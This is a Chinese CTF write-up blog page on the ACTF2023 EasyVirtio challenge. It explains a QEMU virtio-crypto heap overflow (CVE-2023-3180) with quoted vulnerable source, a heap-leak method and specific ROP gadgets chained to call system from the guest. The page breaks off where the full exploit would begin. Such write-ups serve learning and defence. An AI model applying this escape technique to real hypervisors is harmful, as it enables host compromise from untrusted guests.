@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/four.jpg">
+  <link rel="icon" href="/img/four.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xtxtn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="又是事后诸葛，当时自己做的时候唯唯诺诺，等官方的wp出来了才敢重拳出击（🤡） 唯唯诺诺给的设备是virtio-crypto-pci，这个设备就在qemu的源码中，回想到大半个月前复现的《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》中也有利用到hw&#x2F;virtio目录中的设备，最后看了一下源码，果然和前面的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF2023 EasyVirtio">
+<meta property="og:url" content="https://xtxtn.github.io/2023/11/02/ACTF2023/index.html">
+<meta property="og:site_name" content="xtxtn&#39;s Blog">
+<meta property="og:description" content="又是事后诸葛，当时自己做的时候唯唯诺诺，等官方的wp出来了才敢重拳出击（🤡） 唯唯诺诺给的设备是virtio-crypto-pci，这个设备就在qemu的源码中，回想到大半个月前复现的《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》中也有利用到hw&#x2F;virtio目录中的设备，最后看了一下源码，果然和前面的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-02%20125621.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-07%20120023.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-07%20141901.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-06%20130209.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-07%20150249.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-06%20202907.png">
+<meta property="article:published_time" content="2023-11-02T08:20:50.917Z">
+<meta property="article:modified_time" content="2023-11-07T07:49:00.677Z">
+<meta property="article:author" content="xtxtn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xtxtn.github.io/img/23/Screenshot%202023-11-02%20125621.png">
+  
+  
+  
+  <title>ACTF2023 EasyVirtio - xtxtn&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xtxtn.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xtxtn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/th.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ACTF2023 EasyVirtio"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-02 16:20" pubdate>
+          2023年11月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          231 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ACTF2023 EasyVirtio</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>又是事后诸葛，当时自己做的时候唯唯诺诺，等官方的wp出来了才敢重拳出击（🤡）</p>
+<h3 id="唯唯诺诺"><a href="#唯唯诺诺" class="headerlink" title="唯唯诺诺"></a>唯唯诺诺</h3><p>给的设备是virtio-crypto-pci，这个设备就在qemu的源码中，回想到大半个月前复现的《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》中也有利用到hw&#x2F;virtio目录中的设备，最后看了一下源码，果然和前面的调用方式一样：<a href="https://xtxtn.github.io/2023/10/12/ErrorHandling/#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8">Misuse Error Handling Leading To QEMU&#x2F;KVM Escape - xtxtn’s Blog</a></p>
+<p>接下来就是找漏洞函数了，给的是qemu中存在的设备，这种一般在CTF比赛中是patch一些代码来实现漏洞，但是题目作者也没有给出任何patch的信息，而且这个设备的函数非常多，肯定不能一个一个去在ida看，所以直接编译一个版本接近的qemu，然后去用bindiff去比较，这样就能节约大量时间。</p>
+<p>当时我拿qemu-7.2.2去比较的情况</p>
+<img src="/img/23/Screenshot 2023-11-02 125621.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+
+<p>​                                    </p>
+<p>从上往下表示匹配度依次降低，最下面的virtio_crypto_init_config函数是一些qemu的初始化调用，后序无法调用，排除该函数； virtio_crypto_guest_notifier_pending和virtio_crypto_guest_notifier_mask函数相比于qemu-7.2.2反而多了一些对参数判断（😦），应该也不是patch代码，所以排除这两个函数；最后看virtio_crypto_sym_input_data_helper函数，对比一下可以明显看到，该函数开头少了一个判断</p>
+<img src="/img/23/Screenshot 2023-11-07 120023.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>​                       </p>
+<p>具体定位到源码就是少了<code>if (status != VIRTIO_CRYPTO_OK)</code>这个判断，可以肯定这就是patch的漏洞代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">virtio_crypto_sym_input_data_helper</span><span class="hljs-params">(VirtIODevice *vdev,</span><br><span class="hljs-params">                VirtIOCryptoReq *req,</span><br><span class="hljs-params">                <span class="hljs-type">uint32_t</span> status,</span><br><span class="hljs-params">                CryptoDevBackendSymOpInfo *sym_op_info)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> s, len;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">in_iov</span> =</span> req-&gt;in_iov;<br><br>    <span class="hljs-keyword">if</span> (status != VIRTIO_CRYPTO_OK) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    len = sym_op_info-&gt;src_len;<br>    <span class="hljs-comment">/* Save the cipher result */</span><br>    s = iov_from_buf(in_iov, req-&gt;in_num, <span class="hljs-number">0</span>, sym_op_info-&gt;dst, len);<br>    <span class="hljs-keyword">if</span> (s != len) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;virtio-crypto dest data incorrect&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>	...<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当时我做到这一步以后就不知道后续了，直到比赛结束也没想出来怎样去利用这个patch。</p>
+<h3 id="重拳出击"><a href="#重拳出击" class="headerlink" title="重拳出击"></a>重拳出击</h3><p>看完官方的<a target="_blank" rel="noopener" href="https://github.com/team-s2/ACTF-2023/tree/main/pwn/EasyVirtio/writeup">wp</a>后一下子全明白了。</p>
+<p>这题用到了<a target="_blank" rel="noopener" href="https://gitlab.com/qemu-project/qemu/-/commit/9d38a8434721a6479fe03fb5afb150ca793d3980">CVE-2023-3180</a>，在virtio_crypto_sym_op_helper函数中<code>op_info-&gt;src_len</code>为原始数据的长度，<code>op_info-&gt;src</code>为原始数据地址，<code>op_info-&gt;dst_len</code>为加解密数据的长度，而最后的加解密的数据会写入到<code>op_info-&gt;dst</code>中；而op_info这个结构体和数据都在同一个堆块中， <code>op_info-&gt;dst</code>的地址通过是src_len这些其它数据的长度最后来确定的，也就是在堆的末尾，由于没有对<code>op_info-&gt;src_len</code>和<code>op_info-&gt;dst_len</code>的检查，当<code>op_info-&gt;src_len</code>大于<code>op_info-&gt;dst_len</code>时最后的加解密数据就会堆溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> CryptoDevBackendSymOpInfo *<br><span class="hljs-title function_">virtio_crypto_sym_op_helper</span><span class="hljs-params">(VirtIODevice *vdev,</span><br><span class="hljs-params">           <span class="hljs-keyword">struct</span> virtio_crypto_cipher_para *cipher_para,</span><br><span class="hljs-params">           <span class="hljs-keyword">struct</span> virtio_crypto_alg_chain_data_para *alg_chain_para,</span><br><span class="hljs-params">           <span class="hljs-keyword">struct</span> iovec *iov, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num)</span><br>&#123;<br>    ...<br>    max_len = (<span class="hljs-type">uint64_t</span>)iv_len + aad_len + src_len + dst_len + hash_result_len;<br>    <span class="hljs-keyword">if</span> (unlikely(max_len &gt; vcrypto-&gt;conf.max_size)) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;virtio-crypto too big length&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>	op_info = g_malloc0(<span class="hljs-keyword">sizeof</span>(CryptoDevBackendSymOpInfo) + max_len);<br>    op_info-&gt;iv_len = iv_len;<br>    op_info-&gt;src_len = src_len;<br>    op_info-&gt;dst_len = dst_len;<br>    op_info-&gt;aad_len = aad_len;<br>    op_info-&gt;digest_result_len = hash_result_len;<br>    op_info-&gt;hash_start_src_offset = hash_start_src_offset;<br>    op_info-&gt;len_to_hash = len_to_hash;<br>    op_info-&gt;cipher_start_src_offset = cipher_start_src_offset;<br>    op_info-&gt;len_to_cipher = len_to_cipher;<br>    ...<br>    ...<br>    <span class="hljs-keyword">if</span> (op_info-&gt;src_len &gt; <span class="hljs-number">0</span>) &#123;<br>        DPRINTF(<span class="hljs-string">&quot;src_len=%&quot;</span> PRIu32 <span class="hljs-string">&quot;\n&quot;</span>, op_info-&gt;src_len);<br>        op_info-&gt;src = op_info-&gt;data + curr_size;<br><br>        s = iov_to_buf(iov, out_num, <span class="hljs-number">0</span>, op_info-&gt;src, op_info-&gt;src_len);<br>        <span class="hljs-keyword">if</span> (unlikely(s != op_info-&gt;src_len)) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;virtio-crypto source data incorrect&quot;</span>);<br>            <span class="hljs-keyword">goto</span> err;<br>        &#125;<br>        iov_discard_front(&amp;iov, &amp;out_num, op_info-&gt;src_len);<br><br>        curr_size += op_info-&gt;src_len;<br>    &#125;<br><br>    <span class="hljs-comment">/* Handle the destination data */</span><br>    op_info-&gt;dst = op_info-&gt;data + curr_size;<br>    curr_size += op_info-&gt;dst_len;<br>	...<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>除了上面我自己发现的patch，作者也给出了其它的patch代码，让漏洞可以更好利用。</p>
+<p>虽然这题用到了CVE，但是自己也太粗枝大叶了，当时完全没有注意到virtio_crypto_sym_input_data_helper函数中的<code>s = iov_from_buf(in_iov, req-&gt;in_num, 0, sym_op_info-&gt;dst, len)</code>，里面的len是src_len，而读取的地址是dst，这两个关系并不对应，如果注意到了说不定就可以继续做下去了。对于其它的patch代码在那张匹配度表中也可以找到，而且就在virtio_crypto_sym_input_data_helper函数上面，但是当时我却没有继续看下去…..                 </p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>virtio_crypto_sym_input_data_helper函数中的<code>if (status != VIRTIO_CRYPTO_OK)</code>这个判断，需要将op_info-&gt;src加解密写入到op_info-&gt;dst后才能读取op_info-&gt;dst中的内容，而patch后可以直接读取到op_info-&gt;dst中的数据，这样就可以直接将堆中的数据泄漏出来。</p>
+<p>virtio_crypto_sym_op_helper函数中的patch将op_info-&gt;dst后面附加为一个g_free函数地址</p>
+<img src="/img/23/Screenshot 2023-11-07 141901.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>最后在virtio_crypto_free_request函数在去调用该地址</p>
+<img src="/img/23/Screenshot 2023-11-06 130209.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>​                              </p>
+<p>最直接的想法就是直接泄漏g_free函数的地址，然后修改后去劫持控制流；如果直接修改为system之内的函数是完全行不通的，<code>op_info-&gt;data[max_len])(op_info)</code>前就已经将op_info中的内容都清空了，无法执行任何命令，这就需要用一些gadget去跳转；自己首先联想到以前堆题中常用的 <code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>这个指令，自己也寻找了类似指令，要利用这种指令还要知道堆地址，但是每次释放op_info时完全不好去预测该地址，自己在virtio-crypto设备中也没能找到malloc原语去稳定堆布局，这里我用到之前复现《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》学到的跨域攻击，去泄漏虚拟机在qemu中的地址就可以实现相关gadget的利用。</p>
+<p>在virtqueue_split_pop函数中elem就会写入虚拟机的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_split_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>   ...<br>   ...<br>    elem = virtqueue_alloc_element(sz, out_num, in_num);<br>    elem-&gt;index = head;<br>    elem-&gt;ndescs = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; out_num; i++) &#123;<br>        elem-&gt;out_addr[i] = addr[i];<br>        elem-&gt;out_sg[i] = iov[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; in_num; i++) &#123;<br>        elem-&gt;in_addr[i] = addr[out_num + i];<br>        elem-&gt;in_sg[i] = iov[out_num + i];<br>    &#125;<br>   ...<br>   ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>elem的大小由out_num和in_num来决定，直接构造多个VRingDesc结构体就能让out_num增加，让elem申请到一块超大的堆块，之后释放进入unsorted bin；接下来控制op_info-&gt;src，让op_info的大小与elem的大小相近，但要小一点，op_info就可以申请到之前elem用过的堆块，与op_info后面相邻的堆块依然残留有之前elem的信息，利用virtio_crypto_sym_input_data_helper直接读取其中的信息就可以泄漏虚拟机的地址</p>
+<img src="/img/23/Screenshot 2023-11-07 150249.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>​                    </p>
+<p>最后调用op_info-&gt;data[max_len])(op_info)时rax与rdi相等，这里我寻找的gadget是<code>mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]</code>，将op_info-&gt;data[max_len]修改为gadget的地址，rax + 0x648写入虚拟机执行命令的地址，由于调用system函数时对rsp有对齐的限制，rax + 0x640并不能直接写入system的地址，这里写入的另一个gadget  <code>call qword ptr [rdi + 0x40]</code>，这时rdi已经是虚拟机的地址，在rdi + 0x40写入system就可以完成利用。</p>
+<p>相关函数的调用直接看：</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/hw/virtio/virtio-crypto.c">https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/hw/virtio/virtio-crypto.c</a></p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/backends/cryptodev-builtin.c#L215">https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/backends/cryptodev-builtin.c#L215</a></p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/backends/cryptodev-builtin.c#L540">https://elixir.bootlin.com/qemu/v8.1.0-rc1/source/backends/cryptodev-builtin.c#L540</a></p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>exp看上去有700多行，但大部分都是直接搬过来的结构体，懒得去删改….</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span 